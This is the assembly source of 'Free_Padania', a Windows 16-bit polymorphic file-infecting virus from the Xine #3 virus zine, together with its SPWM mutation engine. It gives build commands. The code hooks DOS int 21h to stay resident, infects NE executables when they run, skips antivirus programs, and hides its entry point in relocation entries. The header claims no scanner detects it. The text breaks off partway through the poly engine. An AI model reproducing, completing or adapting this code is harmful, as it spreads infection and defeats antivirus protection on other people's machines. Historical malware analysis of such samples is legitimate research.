   ;                                        /-----------------------------\
   ;                                        | Xine - issue #3 - Phile 205 |
   ;                                        \-----------------------------/



   ;
   ; Virus Name    : Free_Padania
   ; Virus Author  : b0z0/iKX
   ; Origin        : Padania, 97/98
   ; Target        : NE files
   ; Compiling     : TASM 3.0 and TLINK 5.0 should be used
   ;                       tasm /m5 free.asm
   ;                       tlink /Twe free,,,,free.def
   ; Goodies       : This is a Windows TSR polymorphic virus that infects NE
   ;                 files on execute (4b00h) by using the midfile infection on
   ;                 relocations method. The poly engine used is the SPWM 0.1,
   ;                 check the poly precomment for more infos about it. The poly
   ;                 itself isn't too powerfull, it is just intended to prevent
   ;                 simple signature scanning. The infection method used replaces
   ;                 a random relocation entry of a randomly selected segment
   ;                 with a call to the code. In this way the virus can gain
   ;                 power at a random point of the program execution or under
   ;                 some special circumstances. So the detection of the entry
   ;                 point to the virus is quite hard and expensive in terms of
   ;                 time and resources, thus giving AVs a bad time. Please check
   ;                 the complete article on the method supplied with this zine
   ;                 for a deeper discussion.
   ; AV scans      : What should AVs say? Just nutin. (F-Prot 2.28b and 3.0,
   ;                 AVP, TBAV, AVAST!, Findvirus, DrWeb, all quite updated)
   ; Greets        : To all the VXers, AVers and others guys I had fun with
   ;                 in some way... this virus is basically dedicated to anyone
   ;                 out there, with a special reference to one... ;*
   ; For someone   : I'm lost so I am cruel but I'd be love and sweetness if
   ;                 I had you. I'm waiting.... I'm waiting for you.
   ;

   .model small
   .386

   .data
   fuck_data       dw      0               ; just tasm

   .code

   assume          ds:@code

                   org     00h

   free_start:                             ; virus entry point
                   pushf
                   push    ds
                   pushad                  ; save everything, badly needed :)
                   push    es

                   call    delta_offset
   delta_offset:
                   pop     bp              ; delta offset in BP
                   sub     bp,offset delta_offset

                   mov     ax,0ah
                   push    cs
                   pop     bx
                   int     31h             ; make CS writeable

                   mov     ds,ax
                   mov     bx,08h
                   xchg    bx,ax

                   xor     cx,cx
                   mov     dx,free_mem     ; set limit of the data segment
                   int     31h

                   mov     di,word ptr ds:[mb_relocated+bp]  ; restore original
                   mov     eax,dword ptr ds:[di]             ; changed stuff
                   mov     dword ptr ds:[orig_code+1+bp],eax

                   mov     di,word ptr ds:[poly_shitb+bp]  ; put the jmp directly
                   mov     byte ptr ds:[di],0e9h           ; to the restore point
                   mov     ax,word ptr ds:[begin_vir+bp]
                   add     ax,(offset orig_code - 3)
                   sub     ax,di
                   mov     word ptr ds:[di+1],ax

   ; DS = CS but writeable

                   mov     ax,181bh
                   mov     ebx,' rof'       ; residency check
                   int     21h

                   cmp     eax,'*: u'
                   je      already_resident

   ; ok, let's go resident then

                   mov     ax,0204h        ; get prot mode int 21h vector
                   mov     bl,21h
                   int     31h

                   push    cx              ; save int 21h handler
                   push    dx
                   pop     dword ptr ds:[orig_21h+bp]

                   mov     ax,501h         ; allocate mem
                   mov     cx,free_mem
                   xor     bx,bx
                   int     31h
                   jc      already_resident        ; exit on error

                   push    cx

                   sub     ax,ax                   ; create selector
                   mov     cx,1
                   int     31h

                   pop     dx
                   mov     cx,bx           ; set new selector to our mem
                   mov     bx,ax           ; bx sel
                   mov     ax,07h
                   int     31h

                   xor     cx,cx           ; set limit
                   mov     dx,free_mem
                   mov     ax,08h
                   int     31h

                   cld
                   mov     cx,free_size_d
                   mov     es,bx
                   xor     di,di
                   mov     si,bp
                   rep     movsd           ; copy virus to memory

                   mov     bx,es
                   mov     ax,09h          ; set access rights
                   mov     cx,0ffh
                   int     31h

                   mov     dx,offset int_21h_handler
                   mov     cx,es
                   mov     ax,205h
                   mov     bl,21h          ; finally set pm int 21h
                   int     31h

                   mov     ax,0ah
                   mov     bx,cx           ; make the virus segment writeable
                   int     31h

                   mov     es,ax           ; AX = virus segment, writeable
                   mov     word ptr es:[our_sel_wr],ax     ; store the selector
                                                           ; for later use

                   push    ax
                   mov     ax,4            ; lock code selector
                   mov     bx,es
                   int     31h

                   pop     bx
                   mov     ax,4            ; lock code "writeable" selctor
                   int     31h

   already_resident:

   ; we have now to restore registers. the host passed us control with a
   ; call far then we can just jump far to the original routine, since this
   ; will simulate sorta call far from the original position in host. infact
   ; on the stack will be the return adress from the point where the virus
   ; was called, this is where we must return later.


                   mov     bx,ds           ; free used descriptor
                   mov     ax,01h
                   int     31h

                   pop     es
                   popad
                   pop     ds
                   popf
   orig_code:
                   mov     ax,4c00h        ; first gen only! here the jmp far
                   int     21h             ; to the orig item will be placed

   virus_name      db      0,'Free_Padania',0
   virus_autor     db      '-b0z0/iKX-',0

   mb_relocated    dw      offset orig_code + 1    ; where the ffff:0 that will
                                                   ; be relocated is in this
                                                   ; segment
   begin_vir       dw      0                       ; where poly decryptor begins
                                                   ; in this segment
   poly_shitb      dw      offset poly_body

   int_21h_handler:
                   pushf
                   cmp     ax,181bh
                   jne     no_resident
                   cmp     ebx,' rof'
                   jne     no_resident
                   mov     eax,'*: u'
                   popf
                   iret
   no_resident:
                   cmp     ax,4b00h        ; execute
                   je      infect_file

   chain_21h:
                   popf
                   db      0eah            ; chain to next one
   orig_21h        dd      00h


   ; Files to skip (antiviruses and files with selfcheck)
   bad_strings     db      'GR','AN','AV','IL','ED','LP','ND','US','86'
                   db      'RE','RK','PL',0

   infect_file:
                   pushad
                   push    ds
                   push    es

                   mov     ax,word ptr cs:[our_sel_wr]
                   mov     es,ax                   ; ES = CS but writeable

                   cld
                   mov     si,dx
   dot_loop:
                   cmp     byte ptr ds:[si],'.'    ; find the dot
                   je      got_dot
   back_inloop:
                   inc     si
                   jmp     dot_loop
   got_dot:
                   cmp     byte ptr ds:[si+4],00h  ; be sure last dot
                   jne     back_inloop

                   dec     si                      ; SI on last two chars
                   dec     si

                   lodsw

                   mov     si,offset bad_strings
   bad_loop:
                   cmp     word ptr ds:[di-2],ax
                   jne     next_bad
                   jmp     exit_infection

   next_bad:
                   inc     si
                   inc     si
                   cmp     byte ptr cs:[si],00h    ; end of strings
                   jne     bad_loop

                   mov     ax,4300h                ; get attributes
                   int     21h

                   mov     word ptr es:[attributes],cx
                   xor     cx,cx
                   call    set_attributes
                   jc      exit_infection

                   push    ds
                   push    dx
                   pop     dword ptr es:[file_dsdx]

                   mov     ax,3d02h                ; open file for rw
                   int     21h
                   jc      exit_inf_att

                   push    es
                   pop     ds                      ; DS = CS + write

                   mov     bx,ax

                   mov     ax,5700h                ; get time/date
                   int     21h

                   push    dx
                   push    cx
                   pop     dword ptr ds:[timestamp]

                   mov     ah,3fh                  ; read in header
                   mov     cx,040h
                   mov     si,offset exeheader
                   mov     dx,si
                   int     21h

                   cmp     word ptr ds:[si],'ZM'
                   jne     exit_inf_close
                   cmp     byte ptr ds:[si+18h],'@'
                   jne     exit_inf_close

                   cmp     word ptr ds:[si+12h],'PF'  ; infection marker as virus
                   je      exit_inf_close             ; name

   infect_exe:
                   mov     di,offset winexe_data

                   mov     ax,word ptr [si+3ch]      ; nexe header offset
                   mov     word ptr ds:[di],ax

                   mov     word ptr ds:[si+12h],'PF' ; infection marker

                   sub     word ptr ds:[si+3ch],8    ; enought room?
                   cmp     word ptr ds:[si+3eh],0
                   jne     exit_inf_close

                   sub     al,al
                   mov     dx,word ptr ds:[di]     ; to newexe header
                   call    seekfile_mid_cx

                   mov     ah,3fh                  ; read NE header
                   mov     cx,512
                   mov     si,offset neheader
                   mov     dx,si
                   int     21h

                   cmp     word ptr ds:[si+36h],0802h  ; only Win NewEXEs
                   jne     exit_inf_close              ; with gangload area

                   cmp     word ptr ds:[si],'EN'   ; don't infect LE/PE
                   jne     exit_inf_close

   ok_newexe:
                   mov     byte ptr ds:[orig_code],0eah    ; JMP Far

                   pushad
   srtr1:
                   call    sorta_random
                   cmp     al,04
                   jb      srtr1
                   xor     ah,ah
                   mov     word ptr ds:[poly_shitb],ax     ; stupid bytes at
                                                           ; start of the segment
                   cld
                   mov     cx,ax
                   mov     di,offset poly_body
                   push    cx
   put_shit:
                   call    sorta_random    ; put krap bytes
                   stosb
                   loop    put_shit
                   pop     cx

                   push    di
                   sub     cl,04
   srtran1:
                   call    sorta_random    ; put in rnd middle of the krap bytes
                   cmp     al,cl           ; the dword that will be relocated
                   ja      srtran1
                   xor     ah,ah
                   mov     di,offset poly_body
                   add     di,ax
                   mov     dword ptr ds:[di],0000ffffh
                   sub     di,offset poly_body             ; save adress for
                   mov     word ptr ds:[mb_relocated],di   ; restoration

                   pop     di

                   mov     bp,offset poly_body
                   xor     si,si
                   mov     cx,free_size                    ; call SPWM
                   call    poly

   srtr2:
                   call    sorta_random
                   cmp     al,4
                   jb      srtr2

                   xor     ah,ah           ; some nonsense bytes after poly
                   mov     cx,ax
   put_shit_after:
                   call    sorta_random
                   stosb
                   loop    put_shit_after

                   mov     ax,di
                   sub     ax,offset poly_body
                   mov     word ptr ds:[entire_pl],ax

                   popad

                   mov     ax,word ptr ds:[si+22h] ; segment table offset
                   push    ax

                   xor     ecx,ecx
                   mov     cx,ax
                   sub     ecx,512
                   push    ecx
                   push    ecx
                   pop     dx
                   pop     cx
                   mov     al,01h
                   call    seekfile_mid            ; go to seg table

                   mov     dx,offset seg_table
                   mov     ah,3fh
                   mov     cx,100h                 ; read 100h bytes of the
                   int     21h                     ; segment table for later

                   xor     edx,edx
                   mov     dx,ax                   ; ax=nr of readed bytes

                   pop     ecx
                   add     ecx,edx
                   neg     ecx                     ; set filepointer back after
                   mov     al,01h                  ; the first 512 chunk of the
                   call    seekfile_mid            ; NE

                   pop     ax
                   mov     dx,8
                   cmp     word ptr ds:[si+4],ax
                   jb      no_firsta
                   add     word ptr ds:[si+4],dx

   no_firsta:
                   mov     cx,4
                   push    si
                   add     si,24h
   pnt_check:
                   cmp     word ptr ds:[si],ax     ; change offset to table
                   jb      no_8_add                ; where needed
                   add     word ptr ds:[si],dx
   no_8_add:
                   inc     si
                   inc     si
                   loop    pnt_check
                   pop     si

                   mov     ax,word ptr [si+1ch]
                   inc     word ptr [si+1ch]
                   mov     cx,dx

                   sub     edx,edx
                   mov     byte ptr ds:[si+37h],dl
                   mov     dword ptr ds:[si+38h],edx ; kill fastload area,
                   mul     cx                        ; shouldn't be needed

                   mov     cx,512
                   add     ax,word ptr ds:[si+22h]
                   adc     dx,0

                   div     cx

                   mov     word ptr ds:[di+3h],ax          ; NE size
                   mov     word ptr ds:[di+5h],dx

                   mov     ax,offset free_start
                   add     ax,word ptr ds:[poly_shitb]     ; + the illogical bytes
                   push    ax
                   pop     word ptr ds:[mid_ip]

                   push    word ptr ds:[si+1ch]
                   pop     word ptr ds:[mid_cs]


                   mov     al,byte ptr ds:[si+32h]         ; segment align
                   mov     byte ptr ds:[di+2h],al

                   mov     ax,word ptr ds:[di]             ; newexe offset
                   mov     word ptr ds:[di+7h],ax

   move_header_fwd:
                   mov     ax,word ptr ds:[di+3h]          ; ne header size
                   or      ax,ax
                   jz      last_page

                   dec     word ptr ds:[di+3h]

                   sub     al,al
                   mov     dx,word ptr ds:[di+7h]          ; where to go
                   sub     dx,8
                   call    seekfile_mid_cx

                   mov     ah,40h                          ; write
                   mov     cx,512
                   add     word ptr ds:[di+7h],cx
                   mov     dx,si
                   int     21h

                   sub     al,al
                   push    cx
                   mov     dx,word ptr ds:[di+7h]          ; to next chunk
                   call    seekfile_mid_cx
                   mov     ah,3fh                          ; read it
                   mov     dx,si
                   pop     cx
                   int     21h

                   jmp     move_header_fwd

   last_page:
                   mov     al,02h
                   call    seekfile

                   mov     cl,byte ptr ds:[di+2h]          ; segment align
                   push    bx
                   mov     bx,1
                   shl     bx,cl                   ; shift segment offset
                   mov     cx,bx                   ; by segment align
                   pop     bx
                   div     cx

                   mov     word ptr ds:[di+9h],0
                   or      dx,dx
                   jz      no_extra
                   sub     cx,dx
                   mov     word ptr ds:[di+9h],cx
                   inc     ax
   no_extra:
                   push    di
                   mov     di,si
                   add     di,word ptr ds:[last_ne]

   ; create the new segment table entry for virus
                   mov     word ptr [di],ax                ; segment offset
                   mov     ax,word ptr ds:[entire_pl]
                   mov     word ptr [di+2],ax
                   mov     word ptr [di+4],101010000b      ; segment attributes
                                                           ; movable + preloaded
                                                           ; + has relocations
                   add     ax,free_datamem
                   mov     word ptr [di+6],ax
                   pop     di

                   sub     al,al
                   mov     dx,word ptr ds:[di+7h]          ; where to go
                   sub     dx,8
                   call    seekfile_mid_cx

                   mov     ah,40h
                   mov     cx,word ptr ds:[di+5h]          ; write last chunk
                   add     cx,8
                   mov     dx,si
                   int     21h

   ; NE header now is ok
   select_segment:
                   mov     cx,word ptr ds:[mid_cs]         ; nr of reloc + 1
                                                           ; but we want first
                                                           ; to be 0, second 1...
                   sub     cx,3            ; - 1 so they will numbered as we want
                                           ; - 1 not the last (virus) one
                                           ; - 1 not the real last one (usually
                                           ;     data)
                   xor     ch,ch           ; anyway we read just 32 of 'em

   get_segtbl:
                   call    sorta_random    ; get rnd nr in AL
                   and     al,1fh          ; at max 32, since we read just 32
                                           ; entries from the segment table
                   cmp     al,cl
                   ja      get_segtbl

                   xor     ah,ah

                   mov     cx,8            ; lenght of an entry
                   mul     cx

                   mov     di,ax
                   add     di,offset seg_table     ; DI points on the selected
                                                   ; entry

                   mov     ax,word ptr ds:[di+4]   ; get segment attributes
                   and     ax,100000001b           ; must be CODE and must
                                                   ; have relocations
                   cmp     ax,100h
                   jne     select_segment

                   xor     eax,eax
                   mov     cl,byte ptr ds:[al_shift]
                   mov     ax,word ptr ds:[di]             ; location of segment
                                                           ; in logical sectors

                   shl     eax,cl                          ; get in bytes
                   xor     ecx,ecx
                   mov     cx,word ptr ds:[di+2]           ; segment size in bytes

                   add     eax,ecx                 ; eax = end of segment in file
                   push    eax
                   pop     dx
                   pop     cx
                   xor     al,al
                   call    seekfile_mid            ; go to the end of the segment
                                                   ; to relocations

                   mov     ah,3fh                          ; read nr of relocs
                   mov     cx,802h                         ; and 256d rel items
                   mov     dx,offset reloc_nr
                   int     21h

                   mov     di,ax           ; number of effectively readed bytes
                   dec     di
                   dec     di              ; - one word (the reloc_nr one)

   ; ok, now we have the relocation items of the segment in reloc_items and the
   ; number of items in reloc_nr

                   mov     dx,64d     ; DX max possible tries, so we are sure
                                      ; that there won't be an infinite loop
                                      ; (should occour if no 32b PTR reloc in
                                      ; segment). And 64 should be enough to get
                                      ; a good one if present. This check isn't
                                      ; done for segments, since at least one
                                      ; with a reloc entry is present. (we all
                                      ; hope so, at least ;)) )
   select_relocitem:
                   dec     dx

                   or      dx,dx                   ; zero? start from beginning
                   jz      select_segment          ; by getting a segment

                   mov     cx,word ptr ds:[reloc_nr]
                   dec     cx                      ; first will be 0 and so on

                   xor     ch,ch                   ; max 255

   get_relocitem:
                   call    sorta_random            ; random in AL 0-255
                   cmp     al,cl
                   ja      get_relocitem

                   xor     ah,ah

   ; AX now has the relocation item we have to infect

                   mov     cx,8
                   mul     cx                      ; offset to entry in AX
                   mov     si,ax
                   add     si,offset reloc_items   ; SI on entry to be inf

                   cmp     byte ptr ds:[si],03h    ; must be a 32bit pointer
                   jne     select_relocitem

                   mov     dx,di                   ; how many bytes we readed
                   sub     dx,ax                   ; before
                   neg     dx
                   xor     cx,cx
                   dec     cx
                   mov     al,01h
                   call    seekfile_mid            ; go back in file to the
                                                   ; entry to infect

                   mov     ax,word ptr ds:[si+2]   ; offset of relocation in file

                   mov     di,offset relocitem_nonr

                   mov     dword ptr ds:[di-2],00030001h   ; reset our
                                                   ; reloc stuff. 32bit reloc +
                                                   ; one reloc item (for l8r)
                   mov     word ptr ds:[di+2],ax   ; put in our reloc block

                   mov     dx,di
                   mov     cx,8
                   mov     ah,40h                  ; write modified relocation
                   int     21h                     ; item to file

   ; SI points on changed reloc table entry

                   rep     movsb           ; copy original reloc entry for host
                                           ; restoration (cx=8  bytes from before)
                   sub     si,8
                   mov     ax,word ptr ds:[mb_relocated]
                   mov     word ptr ds:[reloc_pos],ax

                   mov     al,02h
                   mov     dx,word ptr ds:[lseek_add]          ; end of file
                   call    seekfile_mid_cx

                   mov     di,offset poly_body
                   add     di,word ptr ds:[entire_pl]
                   mov     si,offset relocitem
                   mov     cx,0ah
                   rep     movsb

                   mov     dx,offset poly_body
                   sub     di,dx
                   mov     cx,di

                   mov     ah,40h       ; write virus body, garbage and reloc
                   int     21h

   ;; write modified dos header too

                   xor     al,al                   ; to start of the file
                   call    seekfile

                   mov     dx,offset exeheader     ; write exe header
                   mov     ah,40h
                   mov     cx,40h
                   int     21h

   exit_inf_close:
                   push    dword ptr ds:[timestamp]
                   pop     cx
                   pop     dx

                   mov     ax,5701h        ; set old time
                   int     21h

                   mov     ah,3eh          ; close
                   int     21h

   exit_inf_att:
                   push    dword ptr es:[file_dsdx]
                   pop     dx
                   pop     ds
                   mov     cx,word ptr es:[attributes]
                   call    set_attributes          ; set orig attributes
   exit_infection:
                   pop     es
                   pop     ds
                   popad
                   jmp     chain_21h

   vir_msg         db      0,'this one goes out to the one i love',0

   seekfile:                                   ; move around the file
                   sub     ah,ah               ; so cwd will work
                   cwd
   seekfile_mid_cx:
                   sub     cx,cx
   seekfile_mid:
                   mov     ah,42h
                   int     21h
                   ret

   set_attributes:
                   mov     ax,4301h
                   int     21h
                   ret

   include         poly.asm                ; poly engine

   free_end_file:
   ; end of virus on disk

   free_start_mem:
   relocitem:                              ; reloc item for NE
                   dw      1               ; reloc nr
   relocitem_nonr:
                   db      3               ; reloc type
                   db      4               ; reloc flags
   reloc_pos       dw      offset orig_code + 1    ; reloc pos
   mid_cs          dw      0               ; reloc seg target
   mid_ip          dw      0               ; reloc off target
   relocitem_end:

   our_sel_wr      dw      00h             ; selector = CS but writeable

   attributes      dw      00h             ; file attributes
   file_dsdx       dd      00h             ; DS:DX to file
   timestamp       dd      00h             ; file time
   exeheader       db      40h     dup (?) ; exe header
   neheader        db      200h    dup (?) ; nexe header
   seg_table       db      100h    dup (?) ; segment table, max 32d entries
   reloc_nr        dw      00h             ; reloc number in segment
   reloc_items     db      800h    dup (?) ; max 256d reloc entries

   winexe_data:                             ; data needed for newexe
   newexe_off      dw      0                ; infection
   al_shift        db      0
   ne_size         dw      0
   last_ne         dw      0
   lseek           dw      0
   lseek_add       dw      0

   free_size       =       (free_end_file - free_start - poly_mem)
   decspace        =       800h

   entire_pl       dw      00h

   poly_body       db      (100h + 100h + 0ah + free_size + decspace) dup (?)

   free_end_mem:

   reloc_size      =       (relocitem_end - relocitem)

   free_size_d     =       (free_size + 3) / 4
   free_mem        =       (free_end_mem  - free_start)
   free_datamem    =       (free_end_mem  - free_start_mem)

   end     free_start

   ÄÄÄ[POLY.ASM]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ;
   ;  SPWM, Small Padanian Windows Mutator 0.1
   ;  by b0z0/iKX, Padania, in a boring January of 1998
   ;
   ;  This is the first version and maybe the last version of
   ; the SPWM. I started writing this poly engine with the idea to keep it
   ; quite small. It's actually about 1100 bytes, not too much. It creates
   ; poly decryptors to be used for Win16 viruses. The generated decryptor can
   ; use bx,di,si as pointer, all the others except ax for counter and key. The
   ; body is encrypted with a word add/sub/xor with either stable or changing
   ; (again add/sub/xor on 16 or on 8 bit part key) key. It doesn't generate
   ; too much garbage or different decryptor types, but anyway the garbage
   ; generation scheme is quite interesting and compact, I think. give it a
   ; look... Since it is designed for a midfile infector it also stores
   ; everything on the stack at the beginning and restores everything at the
   ; end of the decryptor. A part of the decryptor is also encrypted.
   ; Do what you want with this code, just leave me alone. It is not too
   ; commented, even comments are just where there shouldn't be needed. If
   ; you need some help just contact me.
   ;
   ; Input parameters:
   ;       DS:DI   = Where to place decryptor
   ;       DS:SI   = What to encrypt
   ;       BP      = Offset to substract from real pointer
   ;       CX      = Length of encrypted stuff
   ;
   ; Output:
   ;       DS:DI   = Pointer on the end generated stuff
   ;       CX      = Lenght of generated code
   ;
   ;

   poly:
                   push    di
                   mov     word ptr ds:[lenght],cx
                   mov     word ptr ds:[given_si],si       ; inits
                   xor     eax,eax
                   mov     dword ptr ds:[change_key],eax
                   mov     dword ptr ds:[modify_key],90909090h

                   dec     eax
                   mov     dword ptr ds:[already_pnt],eax
                   mov     word ptr ds:[pushed_regs],ax
                   mov     byte ptr ds:[pushedbx],al

                   mov     al,9ch                          ; pushf
                   stosb

                   call    random_garbage

                   in      al,40h
                   ror     al,1                            ; pusha or pushad
                   jnc     no_32bit
                   inc     byte ptr ds:[made_32bit]
                   mov     al,66h
                   stosb
   no_32bit:
                   mov     al,60h
                   stosb
                   inc     byte ptr ds:[pushed_regs]       ; so we can use regs

                   call    random_garbage

                   mov     al,1eh          ; push ds
                   stosb

                   call    random_garbage

                   mov     cx,04h

   ;now set initial values for pointer, counter, key and set ds=cs but
   ;writeable

   do_pnt_cnt:
                   mov     si,offset already_pnt
                   mov     bx,si
                   call    sorta_random
                   and     al,011b
                   xor     ah,ah

                   add     si,ax
                   cmp     byte ptr ds:[si],0ffh           ; not already done
                   jne     do_pnt_cnt

                   or      al,al
                   jz      do_pointer

                   cmp     al,01b
                   je      do_counter

                   cmp     al,10b
                   je      do_setwrite
                   jmp     do_setkey

   next_inits:
                   call    random_garbage
                   loop    do_pnt_cnt

                   mov     word ptr ds:[decr_begin],di
                   call    random_garbage

   select_mate:
                   call    sorta_random_07
                   cmp     al,02
                   ja      select_mate

                   shl     ax,1
                   mov     bx,offset mathadds
                   add     bx,ax

                   mov     dx,word ptr ds:[bx]     ; operation and its reverse

                   cmp     byte ptr ds:[already_key],0b0h
                   jne     so_use_key

                   mov     al,081h
                   stosb

                   add     dx,0003h
                   mov     al,dl
                   jmp     register_corr
   so_use_key:
                   mov     al,dl
                   stosb                           ; the math is already ok
                   mov     al,0ch                  ; base for si,cx
                   mov     cl,byte ptr ds:[already_key]
                   dec     cl
   oper_add:
                   or      cl,cl
                   jz      register_corr
                   add     al,08
                   dec     cl
                   jmp     oper_add
   register_corr:
                   mov     ah,byte ptr ds:[already_pnt]
                   cmp     ah,06
                   jz      store_it
                   inc     al
                   cmp     ah,07h
                   je      store_it
                   inc     al
                   inc     al
   store_it:
                   stosb
                   cmp     byte ptr ds:[already_key],0b0h
                   jne     so_nothingelse
                   call    sorta_random
                   stosw
                   mov     word ptr ds:[initial_key],ax
   so_nothingelse:
                   mov     byte ptr ds:[encrypt_loop],dh

                   call    random_garbage

   ; now we must create:
   ; 2 dec counter
   ; 2 inc pointer
   ; 1 change key  (if key is used)

                   mov     cx,05
   incdec_pntcnt:
                   mov     si,offset change_key
                   call    sorta_random_07
                   and     al,11b
                   cmp     al,02
                   ja      incdec_pntcnt
                   add     si,ax
                   cmp     byte ptr ds:[si],02     ; already done 2 of those?
                   je      incdec_pntcnt
                   inc     byte ptr ds:[si]
                   or      al,al
                   jz      do_changekey
                   cmp     al,2
                   je      inc_pnt
                   jmp     dec_cnt
   next_loop:
                   stosb
                   call    random_garbage
   next_loopns:
                   loop    incdec_pntcnt

   get_cntrchk:
                   call    sorta_random_07
                   cmp     al,04
                   ja      get_cntrchk

                   mov     si,offset cntr_checks
                   add     si,ax
                   mov     ah,byte ptr ds:[si]
                   mov     al,083h

                   add     ah,byte ptr ds:[already_cnt]
                   stosw

                   in      al,40h
                   mov     cl,al

                   xor     al,al
                   ror     cl,1
                   jnc     with_byte
                   sub     byte ptr ds:[di-2],02h
                   stosb
   with_byte:
                   stosb

                   mov     ax,0374h
                   stosw

                   mov     al,0e9h
                   stosb
                   mov     ax,di
                   sub     ax,word ptr ds:[decr_begin]
                   inc     ax
                   inc     ax
                   neg     ax
                   stosw

                   xor     eax,eax
                   dec     eax
                   mov     dword ptr ds:[already_pnt],eax

                   call    random_garbage

                   mov     bx,0fh
                   call    garbage                 ; more forced to act
                                                   ; again possible prefetch
                                                   ; probs
                   call    random_garbage

                   mov     ax,di
                   sub     ax,bp
                   mov     si,word ptr ds:[pointer_ass]
                   mov     word ptr ds:[si],ax

                   push    di

                   call    random_garbage

                   mov     al,1fh                  ; pop ds
                   stosb

                   call    random_garbage

                   cmp     byte ptr ds:[made_32bit],00h
                   je      no_32bit_pref
                   mov     al,66h
                   stosb
   no_32bit_pref:
                   mov     al,61h                  ; popa
                   stosb

                   mov     byte ptr ds:[pushed_regs],0ffh  ; no more regs to use

                   call    random_garbage

                   mov     al,9dh                  ; popf
                   stosb

                   pop     ax
                   mov     cx,di
                   push    cx
                   sub     cx,bp
                   mov     bp,cx
                   mov     word ptr ds:[begin_vir],bp      ; where virus body
                   pop     cx                              ; starts
                   sub     cx,ax

                   push    cx
                   mov     si,word ptr ds:[counter_ass]
                   mov     dx,word ptr ds:[si]
                   push    dx
                   add     dx,cx
                   inc     dx
                   and     dl,0feh
                   mov     word ptr ds:[si],dx
                   pop     cx

                   mov     si,word ptr ds:[given_si]
                   push    di
                   rep     movsb
                   pop     di
                   pop     ax
                   sub     di,ax

   ; decryptor generation end
                   mov     cx,word ptr ds:[initial_key]
   encrypt_loop:
                   db      31h,0dh                 ; xor [di],cx
   modify_key:
                   db      90h,90h,90h,90h
                   inc     di
                   dec     dx
                   inc     di
                   dec     dx
                   or      dx,dx
                   jnz     encrypt_loop

                   mov     cx,di

                   pop     ax
                   sub     cx,ax
                   ret

   ; add,sub,xor for encryption
   mathadds        db      01h,29h
                   db      31h,31h
                   db      29h,01h

   ; cmp,xor,or,sub,add reg,0 to check counter
   cntr_checks     db      0c0h,0c8h,0e8h,0f0h,0f8h

   poly_marker_ver db      0,'-[SPWM] v0.1-',0

   do_changekey:
                   inc     byte ptr ds:[si]
                   cmp     byte ptr ds:[already_key],0b0h
                   je      next_loopns

   get_keyop:
                   call    sorta_random_07
                   cmp     al,02
                   ja      get_keyop

                   mov     dh,0c1h         ; add
                   or      al,al
                   jz      ok_operoc

                   add     dh,28h          ; sub
                   cmp     al,1
                   je      ok_operoc

                   add     dh,8            ; xor
   ok_operoc:
                   cmp     byte ptr ds:[already_key],3
                   ja      only_16bit
                   in      al,40h
                   ror     al,1
                   jc      only_16bit

                   mov     dl,80h
                   ror     al,1
                   jc      no_high8
                   add     dh,4
   no_high8:
                   mov     word ptr ds:[modify_key],dx
                   add     dh,byte ptr ds:[already_key]
                   dec     dh
                   mov     ax,dx
                   stosw
                   call    sorta_random
                   mov     byte ptr ds:[modify_key+2],al
                   jmp     no_changekey
   only_16bit:
                   mov     al,81h
                   mov     ah,dh
                   mov     word ptr ds:[modify_key],ax
                   dec     ah
                   add     ah,byte ptr ds:[already_key]
                   stosw
                   call    sorta_random
                   stosb
                   mov     word ptr ds:[modify_key+2],ax
                   mov     al,ah
   no_changekey:
                   jmp     next_loop

   do_pointer:
                   call    sorta_random_07
                   cmp     al,byte ptr ds:[bx+3]   ; key
                   je      do_pointer

                   cmp     al,byte ptr ds:[bx+1] ; cntr
                   je      do_pointer

                   cmp     al,03
                   je      ok_selected

                   cmp     al,6                    ; no sp and bp
                   jb      do_pointer

   ok_selected:
                   mov     byte ptr ds:[si],al
                   add     al,0b8h
                   stosb

                   mov     word ptr ds:[bx-8],di   ; pntr assign
                   stosw

                   jmp     next_inits

   do_counter:
                   call    sorta_random_07
                   cmp     al,04h                          ; no SP
                   je      do_counter

                   or      al,al
                   jz      do_counter

                   cmp     al,byte ptr ds:[bx]    ; pntr
                   je      do_counter

                   cmp     al,byte ptr ds:[bx+3]    ; key
                   je      do_counter

                   mov     byte ptr ds:[si],al
                   add     al,0b8h
                   stosb

   not_zeromore:
                   call    sorta_random_07                 ; just a little more
                   or      al,al                           ; shit encrypted
                   jz      not_zeromore
                   add     ax,word ptr ds:[bx-0ah]
                   mov     word ptr ds:[bx-2],di
                   stosw                                   ; lenght
                   mov     word ptr ds:[bx-0ah],ax
                   jmp     next_inits

   do_setwrite:
                   mov     al,0b8h
                   stosb
                   mov     ax,0ah                          ; mov ax,0ah
                   stosw

                   mov     byte ptr ds:[bx+5],00h  ; don't use ax in grb

                   push    bx
                   call    random_garbage
                   pop     bx

                   inc     ch

                   mov     byte ptr ds:[bx+6],03

                   cmp     byte ptr ds:[bx],03    ; se if BX is free
                   je      dopushbx

                   cmp     byte ptr ds:[bx+1],03
                   je      dopushbx

                   cmp     byte ptr ds:[bx+3],03
                   jne     nopushbx
   dopushbx:
                   mov     al,053h                 ; push bx
                   stosb

                   dec     ch

                   call    random_garbage
   nopushbx:
                   mov     al,0eh                  ;push cs
                   stosb

                   call    random_garbage

                   mov     al,05bh         ;pop bx
                   stosb

                   call    random_garbage

                   mov     ax,31cdh        ;int 31h
                   stosw

                   mov     byte ptr ds:[pushedbx],0ffh

                   dec     ch
                   jz      nopopbx

                   inc     ch

                   call    random_garbage
                   mov     al,05bh
                   stosb
   nopopbx:
                   call    random_garbage
                   mov     byte ptr ds:[dont_usethis],0ffh

                   mov     ax,0d88eh       ;mov ds,ax
                   stosw

                   mov     byte ptr ds:[si],0b0h
                   jmp     next_inits

   do_setkey:
                   call    sorta_random
                   ror     al,1
                   jc      do_with_key

                   mov     byte ptr ds:[si],0b0h
                   jmp     next_inits

   do_with_key:
                   call    sorta_random_07
                   cmp     al,04
                   je      do_setkey

                   or      al,al
                   jz      do_with_key

                   cmp     al,byte ptr ds:[bx]
                   je      do_setkey

                   cmp     al,byte ptr ds:[bx+1]
                   je      do_setkey

                   mov     byte ptr ds:[bx+3],al
                   add     al,0b8h
                   stosb

                   call    sorta_random
                   stosw
                   mov     word ptr ds:[bx-6],ax
                   jmp     next_inits

   sorta_random:
                   in      al,40h
                   mov     ah,al
                   in      al,40h
                   xor     al,ah
                   ret

   sorta_random_07:
                   call    sorta_random
                   and     al,07h
                   xor     ah,ah
                   ret

   inc_pnt:
